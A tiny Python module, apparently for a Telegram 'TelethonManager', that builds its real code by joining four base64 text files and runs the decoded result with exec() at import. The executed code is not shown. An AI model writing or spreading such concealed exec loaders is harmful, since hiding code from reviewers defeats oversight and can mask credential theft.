"""TelethonManager — assembled from base64 parts."""
from pathlib import Path
import base64
_dir = Path(__file__).parent
_b64 = "".join((_dir / f"tm_b64_{i}.txt").read_text().strip() for i in range(4))
exec(base64.b64decode(_b64).decode("utf-8"), globals())
